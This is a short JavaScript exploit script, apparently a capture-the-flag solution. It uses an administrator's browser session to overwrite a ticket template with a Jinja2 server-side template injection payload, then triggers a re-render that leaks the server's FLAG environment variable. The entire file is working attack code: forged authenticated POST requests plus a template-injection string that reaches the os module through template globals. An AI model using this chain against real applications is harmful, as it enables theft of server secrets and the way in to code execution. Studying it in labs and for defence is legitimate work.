(async () => {
  const tpl = `<html><body><h1>{{ cycler.__init__.__globals__.os.environ['FLAG'] }}</h1></body></html>`;

  await fetch("/admin/templates/1/edit", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: new URLSearchParams({
      name: "Default Ticket Template",
      html_content: tpl,
      is_default: "on",
    }),
  });

  await fetch("/admin/tickets/1/regenerate", {
    method: "POST",
    credentials: "include",
  });
})();
